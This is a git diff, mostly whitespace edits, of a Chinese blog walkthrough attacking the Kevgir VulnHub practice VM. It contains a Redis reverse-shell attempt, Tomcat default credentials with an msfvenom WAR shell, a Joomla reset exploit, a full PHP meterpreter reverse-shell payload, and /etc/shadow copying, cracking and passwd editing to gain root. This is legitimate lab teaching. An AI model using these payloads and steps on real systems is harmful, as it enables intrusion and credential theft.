@@ -1,6 +1,6 @@
 ---
 title: 靶机日记 一 | Kevgir
-top: 6
+top: 10
 categories:
   - Technical
 tags:
@@ -11,17 +11,17 @@ date: 2020-08-18 18:50:10
 
 靶机地址：https://www.vulnhub.com/entry/kevgir-1,137/
 
-盯上这个靶机是因为最近在看一些未授权访问漏洞总结，主要是针对Redis、Jenkins等Web服务的未授权访问，于是盯上了这个靶机。
+盯上这个靶机是因为最近在看一些未授权访问漏洞总结，主要是针对 Redis、Jenkins 等 Web 服务的未授权访问，于是盯上了这个靶机。
 
 <!-- more -->
 
 ### 一、发现主机
 
-靶机上没有net-tools工具，所以不能直接获取静态ip（但面对目标，我们本来就对其的ip未知。
+靶机上没有 net-tools 工具，所以不能直接获取静态 ip（但面对目标，我们本来就对其的 ip 未知。
 
-首先，把虚拟机的网络选择桥接模式，这样我们的靶机就和自己在一个网段了，这里我要吐槽一下，我原先用的校园网..子网掩码是16位的，扫描出学校几百个主机来，真是头大。。~~为了方便我特地把自己的电脑换成了手机热点，缩短目标范围。~~正确的解决方案是使用host-only模式，给Virtualbox添加一块虚拟网卡。
+首先，把虚拟机的网络选择桥接模式，这样我们的靶机就和自己在一个网段了，这里我要吐槽一下，我原先用的校园网..子网掩码是 16 位的，扫描出学校几百个主机来，真是头大。。~~为了方便我特地把自己的电脑换成了手机热点，缩短目标范围。~~正确的解决方案是使用 host-only 模式，给 Virtualbox 添加一块虚拟网卡。
 
-第一步在命令行使用`ifconfig`查看自己的wifi的ip，接着`nmap -T5 -sP xxx.xxx.xxx.0/24`就可以扫描了。
+第一步在命令行使用`ifconfig`查看自己的 wifi 的 ip，接着`nmap -T5 -sP xxx.xxx.xxx.0/24`就可以扫描了。
 
 ```bash
 promote at ~ ❯ nmap -T5 -sP  192.168.56.0/24
@@ -35,9 +35,9 @@ Host is up (0.0025s latency).
 Nmap done: 256 IP addresses (3 hosts up) scanned in 1.83 seconds
 ```
 
-第一个是网关、第二个是本机ip、第三个就是靶机Kevgir了（如何判定？在浏览器输入`http://172.20.10.8`可以打开运行在其80端口的web服务。
+第一个是网关、第二个是本机 ip、第三个就是靶机 Kevgir 了（如何判定？在浏览器输入`http://172.20.10.8`可以打开运行在其 80 端口的 web 服务。
 
-然后，详细扫描一下靶机，果然开了几万个端口、http服务有四个、80、8080、8081、9000。还有默认开在6379端口的redis
+然后，详细扫描一下靶机，果然开了几万个端口、http 服务有四个、80、8080、8081、9000。还有默认开在 6379 端口的 redis
 
 ```zsh
 Princeling-Mac at ~ ❯ nmap -sV -p- 192.168.56.101
@@ -68,9 +68,9 @@ PORT      STATE SERVICE     VERSION
 
 ![80](http://leiblog.wang/static/image/2020/8/d0YHyw.png)
 
-#### 二、Redis未授权漏洞攻击(失败了:|
+#### 二、Redis 未授权漏洞攻击(失败了:|
 
-Nmap扫描后发现主机的6379端口对外开放，就可以用本地Redis远程连接服务器（redis在开放往外网的情况下，默认配置下是空口令，端口为6379）连接后可以获取Redis敏感数据。首先扫描一下redis服务的详细信息、nmap有个自动扫描脚本。
+Nmap 扫描后发现主机的 6379 端口对外开放，就可以用本地 Redis 远程连接服务器（redis 在开放往外网的情况下，默认配置下是空口令，端口为 6379）连接后可以获取 Redis 敏感数据。首先扫描一下 redis 服务的详细信息、nmap 有个自动扫描脚本。
 
 ```zsh
 promote at ~ ❯ nmap -A -p 6379 --script=redis-info 192.168.56.101
@@ -106,9 +106,9 @@ Ncat: Listening on :::7999
 Ncat: Listening on 0.0.0.0:7999
 ```
 
-注意到本机的ip是：`10.32.187.196`。
+注意到本机的 ip 是：`10.32.187.196`。
 
-连接到redis-cli，准备利用crontab反弹shell
+连接到 redis-cli，准备利用 crontab 反弹 shell
 
 ```zsh
 promote at ~ ❯ redis-cli -h 192.168.56.101
@@ -128,11 +128,11 @@ OK
 
 大概等一分钟才会弹回来？
 
-。。。好像没用，再尝试用ssh私钥登陆的方法，保存失败，看来是没有root权限。
+。。。好像没用，再尝试用 ssh 私钥登陆的方法，保存失败，看来是没有 root 权限。
 
-### 三、从8080端口攻击
+### 三、从 8080 端口攻击
 
-8080端口启动的是tomcat的服务，用nikto扫描一下
+8080 端口启动的是 tomcat 的服务，用 nikto 扫描一下
 
 ```zsh
 promote at ~ ❯ nikto -h 192.168.56.101 -p 8080 -o kevgir.8080.html
@@ -167,14 +167,14 @@ promote at ~ ❯ nikto -h 192.168.56.101 -p 8080 -o kevgir.8080.html
 
 在报告里发现有默认口令的登陆页面：
 
-| URI           | /manager/html                                                |
-| ------------- | ------------------------------------------------------------ |
-| HTTP Method   | GET                                                          |
+| URI           | /manager/html                                                                                                      |
+| ------------- | ------------------------------------------------------------------------------------------------------------------ |
+| HTTP Method   | GET                                                                                                                |
 | Description   | Default account found for 'Tomcat Manager Application' at /manager/html (ID 'tomcat', PW 'tomcat'). Apache Tomcat. |
-| Test Links    | http://192.168.56.101:8080/manager/html http://192.168.56.101:8080/manager/html |
-| OSVDB Entries | [OSVDB-0](http://osvdb.org/0)                                |
+| Test Links    | http://192.168.56.101:8080/manager/html http://192.168.56.101:8080/manager/html                                    |
+| OSVDB Entries | [OSVDB-0](http://osvdb.org/0)                                                                                      |
 
-登陆进去，可以部署war文件、使用msf生成、如何生成可以看我的[Generate payload with MSF](http://leiblog.wang/Generate-payload-with-MSF/)这篇文章。
+登陆进去，可以部署 war 文件、使用 msf 生成、如何生成可以看我的[Generate payload with MSF](http://leiblog.wang/Generate-payload-with-MSF/)这篇文章。
 
 ```zsh
 promote at ~ ❯ msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.56.1 LPORT=4444 -f war > shell.war
@@ -183,13 +183,11 @@ Payload size: 1097 bytes
 Final size of war file: 1097 bytes
 ```
 
-
-
-### 四、从8081端口攻击
+### 四、从 8081 端口攻击
 
 ![](http://leiblog.wang/static/image/2020/8/OAxKRs.png)
 
-Joomla webpage、所以我们使用joomscan来扫描
+Joomla webpage、所以我们使用 joomscan 来扫描
 
 ```zsh
 promote at ~/joomscan ±(master) ❯ perl joomscan.pl -u http://192.168.56.101:8081/
@@ -317,7 +315,7 @@ http://192.168.56.101:8081/xmlrpc/
  config file path : http://192.168.56.101:8081/configuration.php-dist
 ```
 
-刷出很多CVE，咱们随便选一个用；
+刷出很多 CVE，咱们随便选一个用；
 
 https://www.exploit-db.com/exploits/6234/
 
@@ -338,18 +336,18 @@ Example :
 5. Login admin with new password
 
 # milw0rm.com [2008-08-12]
-            
+
 ```
 
 先进入http://192.168.56.101:8081/index.php?option=com_user&view=reset&layout=confirm
 
-跟着2、3部走了之后，再去http://192.168.56.101:8081//administrator/
+跟着 2、3 部走了之后，再去http://192.168.56.101:8081//administrator/
 
-用户名admin、密码就可以进入后台了、接着在后台反弹shell
+用户名 admin、密码就可以进入后台了、接着在后台反弹 shell
 
 ![](http://leiblog.wang/static/image/2020/8/OYdx4c.png)
 
-在这里，然后可以更改页面的php文件，替换成php反弹shell的脚本。
+在这里，然后可以更改页面的 php 文件，替换成 php 反弹 shell 的脚本。
 
 ```bash
 promote at ~ ❯ msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.56.1 lport=4444 -f raw
@@ -360,7 +358,7 @@ Payload size: 1113 bytes
 /*<?php /**/ error_reporting(0); $ip = '192.168.56.1'; $port = 4444; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s && ($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die();
 ```
 
-在msf里配置：
+在 msf 里配置：
 
 ```zsh
 msf5 > use exploit/multi/handler
@@ -398,9 +396,9 @@ drwxr-xr-x 22 root root    4096 Feb 13  2016 ..
 -rwxr-xr-x  1 root root  986672 Oct  7  2014 bash
 ```
 
-`find / -perm -u=s 2>/dev/null`来搜索能够使用的sudo命令。
+`find / -perm -u=s 2>/dev/null`来搜索能够使用的 sudo 命令。
 
-在bin下面使用cp命令，拷贝shadow文件
+在 bin 下面使用 cp 命令，拷贝 shadow 文件
 
 ```zsh
 www-data@canyoupwnme:/bin$ cp /etc/shadow /tmp
@@ -415,7 +413,7 @@ bin:*:16652:0:99999:7:::
 sys:*:16652:0:99999:7:::
 ```
 
-然后复制shadow文件到本机，用john来破解
+然后复制 shadow 文件到本机，用 john 来破解
 
 ```zsh
 ➜  ~ john shadow
@@ -439,11 +437,11 @@ Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
 Proceeding with incremental:ASCII
 ```
 
-好吧、虽然知道了admin和resu的密码，但毕竟还是不知道root的
+好吧、虽然知道了 admin 和 resu 的密码，但毕竟还是不知道 root 的
 
-但可以用admin当跳板,用同样的方法，修改passwd文件，将admin的uid和gid都替换为0、然后在本地搭建一个http服务，把passwd文件传送给靶机。
+但可以用 admin 当跳板,用同样的方法，修改 passwd 文件，将 admin 的 uid 和 gid 都替换为 0、然后在本地搭建一个 http 服务，把 passwd 文件传送给靶机。
 
-Nodejs简易的http服务：
+Nodejs 简易的 http 服务：
 
 ```zsh
 promote at ~ ❯ http-server .
@@ -463,7 +461,7 @@ Hit CTRL-C to stop the server
 [2020-08-19T05:51:02.060Z]  "GET /passwd" "Wget/1.15 (linux-gnu)"
 ```
 
-拿下root权限：
+拿下 root 权限：
 
 ```zsh
 www-data@canyoupwnme:/bin$ cd /tmp
@@ -488,4 +486,3 @@ Password: admin
 
 root@canyoupwnme:/tmp#
 ```
-
